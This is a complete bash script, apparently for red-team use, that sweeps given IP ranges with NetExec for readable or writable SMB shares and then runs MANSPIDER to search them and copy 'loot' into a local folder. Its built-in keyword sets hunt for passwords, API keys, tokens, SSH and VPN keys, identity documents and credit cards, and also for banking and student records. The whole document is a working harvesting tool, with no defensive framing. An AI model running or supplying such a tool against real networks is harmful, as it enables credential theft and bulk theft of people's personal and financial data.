#!/bin/bash

# Default file extensions (used for all pre-made options unless overridden)
DEFAULT_EXTENSIONS="txt doc docx xls xlsx csv db bat com vbs ps1 psd1 psm1 pem key rsa pub reg cfg conf"

# Pre-made keyword sets
KEYWORDS_A="passw user admin account network login logon api_key access_key token cred SSN passport social_security drivers_license creditcard credit_card certificate pem ssh vpn classified confidential internal_use_only"
KEYWORDS_B="account bank routing swift iban transaction credit debit balance statement finance loan mortgage payment atm pin fraud cheque wire beneficiary ledger reconciliation"
KEYWORDS_C="student grade transcript enrollment syllabus professor teacher course assignment exam gpa attendance scholarship bursary tuition academic diploma degree registrar"

# Default loot directory
DEFAULT_LOOT_DIR="$HOME/manspider_loot"

# Usage help function
usage() {
    echo "Usage: $0 -i <ip_range_file> [-l <loot_dir>] [-e <extensions>] [-k <keyword_set>] [-u <username>] [-p <password>]"
    echo "Options:"
    echo "  -i <file>      Path to file containing IP ranges (required)"
    echo "  -l <dir>       Directory to store looted files (default: $DEFAULT_LOOT_DIR)"
    echo "  -e <exts>      Space-separated file extensions to search (default: $DEFAULT_EXTENSIONS)"
    echo "  -k <set>       Keyword set: A (standard), B (banking), C (education), or custom keywords (default: A)"
    echo "  -u <username>  SMB username (optional)"
    echo "  -p <password>  SMB password (optional)"
    echo "  -h, -help      Show this help message"
    exit 1
}

# Check for -help or --help before getopts
if [[ "$1" == "-help" || "$1" == "--help" ]]; then
    usage
fi

# Parse command-line arguments
while getopts "i:l:e:k:u:p:h" opt; do
    case "$opt" in
        i) IP_FILE="$OPTARG" ;;
        l) LOOT_DIR="$OPTARG" ;;
        e) EXTENSIONS="$OPTARG" ;;
        k) KEYWORD_SET="$OPTARG" ;;
        u) USERNAME="$OPTARG" ;;
        p) PASSWORD="$OPTARG" ;;
        h) usage ;;
        ?) usage ;;
    esac
done

# Check required args
if [ -z "$IP_FILE" ]; then
    echo "Error: IP range file is required (-i)"
    usage
fi

if [ ! -f "$IP_FILE" ]; then
    echo "Error: File not found: $IP_FILE"
    exit 1
fi

LOOT_DIR="${LOOT_DIR:-$DEFAULT_LOOT_DIR}"
EXTENSIONS="${EXTENSIONS:-$DEFAULT_EXTENSIONS}"

# Determine keyword set
case "$KEYWORD_SET" in
    "A"|"a"|"") KEYWORDS="$KEYWORDS_A" ;;  # Default to A if unspecified
    "B"|"b") KEYWORDS="$KEYWORDS_B" ;;
    "C"|"c") KEYWORDS="$KEYWORDS_C" ;;
    *) KEYWORDS="$KEYWORD_SET" ;;  # Custom
esac

# Prepare credentials
CME_AUTH_ARGS=("-u" "${USERNAME:-''}" "-p" "${PASSWORD:-''}")
MS_AUTH_ARGS=()
[ -n "$USERNAME" ] && MS_AUTH_ARGS+=("-u" "$USERNAME")
[ -n "$PASSWORD" ] && MS_AUTH_ARGS+=("-p" "$PASSWORD")

# Define output file for discovered hosts
OUTPUT_FILE="spider-hosts.txt"
> "$OUTPUT_FILE"

# Step 1: Scan for accessible SMB shares
echo "Scanning IP ranges from $IP_FILE for accessible SMB shares..."
while IFS= read -r ip_range; do
    echo "Scanning $ip_range..."
    nxc smb "$ip_range" "${CME_AUTH_ARGS[@]}" --shares | awk '/READ|WRITE/ && !/READONLY/ {print $2}' >> "$OUTPUT_FILE"
done < "$IP_FILE"

sort -u "$OUTPUT_FILE" -o "$OUTPUT_FILE"

if [ ! -s "$OUTPUT_FILE" ]; then
    echo "No accessible SMB shares found. Exiting."
    exit 0
fi

echo "Found $(wc -l < "$OUTPUT_FILE") hosts with accessible SMB shares. Starting spidering..."

mkdir -p "$LOOT_DIR"

while IFS= read -r ip; do
    echo "Spidering $ip with keywords: $KEYWORDS..."
    manspider -t 20 "$ip" -l "$LOOT_DIR" -f "$KEYWORDS" -e "$EXTENSIONS" "${MS_AUTH_ARGS[@]}"
done < "$OUTPUT_FILE"

echo "Spidering complete. Loot saved to $LOOT_DIR"
